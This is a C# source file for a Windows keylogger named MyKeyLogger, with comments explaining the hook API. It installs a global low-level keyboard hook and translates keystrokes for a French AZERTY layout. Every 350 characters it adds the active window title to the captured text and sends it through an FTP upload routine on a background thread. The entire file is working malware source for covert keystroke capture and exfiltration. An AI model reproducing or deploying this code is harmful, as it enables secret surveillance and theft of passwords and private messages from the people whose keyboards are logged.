
// https://docs.microsoft.com/fr-fr/windows/win32/winmsg/hooks?redirectedfrom=MSDN

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Diagnostics;
using System.Linq;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using Microsoft.Win32.SafeHandles;

namespace MyKeyLogger
{
	public partial class TrackKeyboard : Form
	{
		public TrackKeyboard()
		{
			InitializeComponent();
		}
	
		private static string data = DateTime.Now.ToString("dd/MM/yyyy HH:mm : ");
		private static Dictionary<int, string> LayoutAzerty = new Dictionary<int, string>
		{
			{49, "&"},
			{50, "é"},
			{51, "\""},
			{52, "'"},
			{53, "("},
			{54, "-"},
			{55, "è"},
			{56, "_"},
			{57, "ç"},
			{48, "à"},
			{219, ")"},
			{187, "="},
			{222, "²"},
			{188, ","},
			{190, ";"},
			{191, ":"},
			{223, "!"},
			{186, "$"},
			{192, "ù"},
			{220, "*"},
			{221, "^"},
			{1049, "1"},
			{1050, "2"},
			{1051, "3"},
			{1052, "4"},
			{1053, "5"},
			{1054, "6"},
			{1055, "7"},
			{1056, "8"},
			{1057, "9"},
			{1048, "0"},
			{1219, "°"},
			{1187, "+"},
			{1188, "?"},
			{1190, "."},
			{1191, "/"},
			{1223, "§"},
			{1186, "£"},
			{1192, "%"},
			{1220, "µ"},
			{1221, "¨"},
			{3050, "~"},
			{3051, "#"},
			{3052, "{"},
			{3053, "["},
			{3054, "|"},
			{3055, "`"},
			{3056, "\\"},
			{3057, "^"},
			{3048, "@"},
			{3219, "]"},
			{3187, "}"},
			{226, "<"},
			{1226, ">"},
			{3186, "¤"},
			{3069, "€"},
			{32, " "}
		};

		private static int[] IgnoredKey = {160, 162, 163, 164, 20, 165};
		// 
		private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYDOWN = 0x0104;
	
        //  
        private static bool CapsLock = false;
        private static bool Caps = false;
        private static bool LControl = false;
        private static bool LMenu = false;
        private static bool RMenu = false;   
	
		//        
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        
        /* 
        The first parameter of SetWindowsHookEx specifies the type of hook procedure to be installed.  
		Here we use WH_KEYBOARD_LL or WH_MOUSE_LL .
		The second parameter is the pointer to the hook procedure. 
		In C# we pass the delegate of the hook callback function to this parameter.
		The third parameter is the handle of the module containing the hook procedure.  
		Therefore, we call the GetModuleHandle to retrieve the current module handle of the C# hook application.
		The fourth parameter specifies the identifier of the thread with which the hook procedure is to be associated.  
		If this parameter is zero, the hook procedure is associated with all existing threads running in the same desktop as the calling thread.
		*/
        // https://docs.microsoft.com/fr-fr/windows/win32/api/winuser/nf-winuser-setwindowshookexa?redirectedfrom=MSDN
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hmod, uint dwThreadId);

        // https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        
	    // https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985(v=vs.85)
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);  
	
        private static IntPtr _hookID = IntPtr.Zero;
		private static LowLevelKeyboardProc _proc = HookCallback;
        
		
		// To conclude the hook procedure, we use CallNextHookEx function to pass the hook information to the next hook procedure in the current hook chain.  
        // https://docs.microsoft.com/fr-fr/windows/win32/api/winuser/nf-winuser-callnexthookex?redirectedfrom=MSDN
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        
        /*
        When we want to stop the low level mouse or keyboard hook, 
        we can use the UnhookWindowsHookEx function to remove the hook procedure installed.
        The parameter is the hook ID we get from the SetWindowsHookEx function.
        */
        // 
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
				int myASCIIKey = Marshal.ReadInt32(lParam);
		        CapsLock = Console.CapsLock;
		        var modif = Control.ModifierKeys;
		        //Console.WriteLine(modif);
		        Caps = (modif == Keys.Shift);
		        //Console.WriteLine((Keys)myASCIIKey);
		        var myKey = Enum.GetName(typeof(Keys), myASCIIKey);
		        //Console.WriteLine(myKey);
		        //Console.WriteLine(myKey);
		        //Console.WriteLine(wParam);

		        if (wParam == (IntPtr) WM_KEYDOWN || wParam == (IntPtr) WM_SYSKEYDOWN)
			        {
				        string val = "";
				        if (myASCIIKey > 64 && myASCIIKey < 91 && (modif == Keys.None || modif == Keys.Shift))
				        {
					        if (Caps ^ CapsLock)
					        {
						        val = myKey;
					        }
					        else
					        {
						        val = myKey.ToLower();
					        }
				        } else
				        {
					        if ((Caps ^ CapsLock) && (modif == Keys.None || modif == Keys.Shift) && !IgnoredKey.Contains(myASCIIKey))
						        myASCIIKey += 1000;
					        if (modif == (Keys.Control | Keys.Alt))
						        myASCIIKey += 3000;


					        if (LayoutAzerty.ContainsKey(myASCIIKey) && (modif == Keys.None || modif == Keys.Shift || modif == (Keys.Control | Keys.Alt)))
					        {
						        val = LayoutAzerty[myASCIIKey];
					        }
					        else if (myASCIIKey < 1000 && LayoutAzerty.ContainsKey(myASCIIKey))
					        {
						        val = "`" + modif + "+" + LayoutAzerty[myASCIIKey] + "`";
					        }
					        else if (!IgnoredKey.Contains(myASCIIKey))
					        {
						        if (modif == Keys.None)
						        {
							        val = "`" + myKey + "`";
						        }
						        else
						        {
							        val = "`" + modif + "+" + myKey + "`";
						        }
					        }
				        }
				        //Console.WriteLine(val);
				        if (val != "" && "\\`".Contains(val))
					        val = "\\" + val;
				        data = data + val;
				        //Console.WriteLine(data.Length);
			        }
		        if (data.Length > 350)
				{

			        data = data + "\n";
			        string tempData = data;
			        data = DateTime.Now.ToString("dd/MM/yyyy HH:mm") + "\\:\\" + ActiveWindows.NomDeLaFenetre() + "\\:\\";
			        //ServerFTP.ConnectionServer(data);
			        Task.Factory.StartNew(() => ServerFTP.ConnectionServer(tempData));
		        }


	        return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        
        public static void Start()
        {        	
	        data = DateTime.Now.ToString("dd/MM/yyyy HH:mm") + "\\:\\" + ActiveWindows.NomDeLaFenetre() + "\\:\\";
        	//var handle = GetConsoleWindow();
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
            //OperationKey.TurnOFFCapsLockKey();
        }
	}
	
}
